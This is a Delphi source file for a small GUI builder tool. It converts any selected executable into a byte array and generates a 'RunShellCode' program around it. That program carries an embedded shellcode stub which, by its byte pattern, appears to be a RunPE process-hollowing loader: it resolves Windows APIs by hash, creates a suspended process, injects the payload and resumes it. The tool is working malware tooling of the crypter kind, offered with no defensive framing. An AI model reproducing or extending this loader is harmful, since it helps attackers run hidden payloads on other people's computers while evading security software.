unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Gauges, StdCtrls, ComCtrls, AdvMemo, AdvmPS,FileCtrl ;

type
  TForm1 = class(TForm)
    edt1: TEdit;
    btn1: TButton;
    Gauge1: TGauge;
    dlgOpen1: TOpenDialog;
    stat1: TStatusBar;
    lbl1: TLabel;
    lbl2: TLabel;
    AdvPascalMemoStyler1: TAdvPascalMemoStyler;
    lbl3: TLabel;
    AdvMemo1: TAdvMemo;
    AdvMemo2: TAdvMemo;
    lbl4: TLabel;
    btn2: TButton;
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);

  
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  _sifx:string;
implementation

{$R *.dfm}


  Function FileToStr(myfile: string): string;
var
sFile: HFile;
Buff: array of byte;
uBytes: Cardinal;
i: integer;


const
  enter=#13#10;
begin
_sifx:=copy(ExtractFileName(myfile),1,length(ExtractFileName(myfile)) - length(ExtractFileExt(myfile)));
sFile:= _lopen(PansiChar(myfile), OF_READ);
uBytes:= GetFileSize(sFile, nil);
Form1.Gauge1.MaxValue:=uBytes div 80 ;
SetLength(Buff, uBytes);
_lread(sfile, @buff[0], uBytes);
_lclose(sFile);

 result:='unit _'+_sifx+';'+enter+

'Interface'+enter+
'Uses Windows;'+ enter+
'type'+enter+
'TbytArray = array[0..'+inttostr(uBytes-1)+'] of byte;'+enter+
'var'+enter+ 'RunPEProc :procedure(arr:TbytArray);'+enter+
'arrRunPE:  array[0..693] of Byte = ( '+enter+
'85,139,236,129,196,164,250,255,255,137,69,252,232,27,2,0,0,137,133,204,253,255,255'+ enter+
',187,242,15,86,198,139,149,204,253,255,255,232,25,2,0,0,137,69,248,187,169,139'+ enter+
',128,45,139,149,204,253,255,255,232,6,2,0,0,137,69,244,187,133,59,174,219,139,149'+ enter+
',204,253,255,255,232,243,1,0,0,137,69,240,187,147,53,223,133,139,149,204,253,255,'+ enter+
'255,232,224,1,0,0,137,69,236,187,141,203,182,93,139,149,204,253,255,255,232,205'+ enter+
',1,0,0,137,69,232,187,83,19,193,120,139,149,204,253,255,255,232,186,1,0,0,137,69'+ enter+
',228,187,138,219,223,165,139,149,204,253,255,255,232,167,1,0,0,137,69,224,187,46'+ enter+
',5,80,200,139,149,204,253,255,255,232,148,1,0,0,137,69,220,187,133,161,22,162,139'+ enter+
',149,204,253,255,255,232,129,1,0,0,232,6,0,0,0,110,116,100,108,108,0,95,87,255'+ enter+
',208,137,133,208,253,255,255,187,139,227,205,65,139,208,232,96,1,0,0,137,69,216,'+ enter+
'187,57,35,13,44,139,149,208,253,255,255,232,77,1,0,0,137,69,212,104,0,2,0,0,141,'+ enter+
'133,212,253,255,255,80,106,0,255,85,248,106,68,141,133,136,253,255,255,80,255,85'+ enter+
',212,255,85,244,139,200,141,133,120,253,255,255,80,141,133,136,253,255,255,80,106'+ enter+
',0,106,0,106,4,106,0,106,0,106,0,81,141,133,212,253,255,255,80,255,85,240,104,204'+ enter+
',2,0,0,141,133,164,250,255,255,80,255,85,212,199,133,164,250,255,255,2,0,1,0,141'+ enter+
',133,164,250,255,255,80,255,181,124,253,255,255,255,85,236,100,161,48,0,0,0,139'+ enter+
',64,12,139,64,20,139,64,16,80,255,181,120,253,255,255,255,85,216,139,125,252,3,'+ enter+
'127,60,106,64,104,0,48,0,0,255,119,80,255,119,52,255,181,120,253,255,255,255,85,'+ enter+
'232,137,133,116,253,255,255,106,0,255,119,84,255,117,252,255,181,116,253,255,255'+ enter+
',255,181,120,253,255,255,255,85,228,141,71,24,137,133,112,253,255,255,15,183,71,'+ enter+
'20,1,133,112,253,255,255,51,192,51,246,51,201,235,41,107,198,40,3,133,112,253,255'+ enter+
',255,139,157,116,253,255,255,3,88,12,139,85,252,3,80,20,106,0,255,112,16,82,83,'+ enter+
'255,181,120,253,255,255,255,85,228,70,102,59,119,6,114,209,139,133,116,253,255,255'+ enter+
',3,71,40,137,133,84,251,255,255,141,133,164,250,255,255,80,255,181,124,253,255'+ enter+
',255,255,85,224,255,181,124,253,255,255,255,85,220,201,195,100,161,48,0,0,0,139,'+ enter+
'64,12,139,64,12,139,0,139,0,139,64,24,195,85,139,236,131,196,244,82,137,85,252,139'+ enter+
',74,60,3,202,137,77,244,139,73,120,3,202,137,77,248,139,81,24,139,73,32,3,77,252'+ enter+
',51,255,139,49,3,117,252,51,192,81,172,139,200,3,248,211,199,133,192,117,245,89'+ enter+
',59,251,116,16,131,193,4,74,117,224,186,194,88,98,27,90,51,192,201,195,139,69,252'+ enter+
',139,77,248,139,89,24,139,73,36,3,200,43,218,209,227,3,203,15,183,25,139,77,248'+ enter+
',139,73,28,3,200,193,227,2,3,203,3,1,90,201,195);'+ enter+
    'Const '+ enter+
    'aSize = '+inttostr(uBytes)+';'+ enter+
 _sifx +': TbytArray =' + enter+
'('+enter;

for i:= 0 to uBytes -1 do begin

  if i= uBytes-1 then
   result:=  result + ','+inttostr(ord(Buff[i]))+');'
  else if i=0 then   result:=  result + inttostr(ord(Buff[i]))
  else
 result:=  result + ','+inttostr(ord(Buff[i]));
if (i mod 20) =0 then begin result:= result+enter;
Form1.Gauge1.Progress:=i div 80 ;
end;
 Application.ProcessMessages;
end;

Form1.Gauge1.Progress:=uBytes div 80 ;
 result:= result+enter+enter+'implementation'+enter+ 'end.'+enter;
   Form1.AdvMemo2.Lines.Text:='program RunShellCode;'+enter+
'uses'+enter+
'_'+_sifx+ ';'+enter+
'begin'+enter+
'RunPEProc := @arrRunPE[0];'+enter+
'RunPEProc('+_sifx+');'+enter+
'end.'+enter;

Form1.lbl2.Caption:='Unit : _'+_sifx+'.pas';
form1.lbl1.caption:='Usage : Project1.dpr';
form1.btn2.Enabled:=True
end;

procedure TForm1.btn1Click(Sender: TObject);
begin
if  not dlgOpen1.Execute then    Exit;
edt1.Text:=dlgOpen1.FileName;
Application.ProcessMessages;
AdvMemo1.Lines.Text:=FileToStr(edt1.Text) ;

end;

procedure TForm1.btn2Click(Sender: TObject);
var
  Directory : string;
begin  //ExtractFilePath(ParamStr(0))
  if SelectDirectory('Select a directory', 'C:\', Directory)
  then
    AdvMemo1.Lines.SaveToFile(Directory+'\_'+_sifx+'.pas');
    AdvMemo2.Lines.SaveToFile(Directory+'\Project1.dpr');
   begin stat1.Panels[0].Text:='Save to Directory '+Directory +' Ok..'
  end;

end;

end.
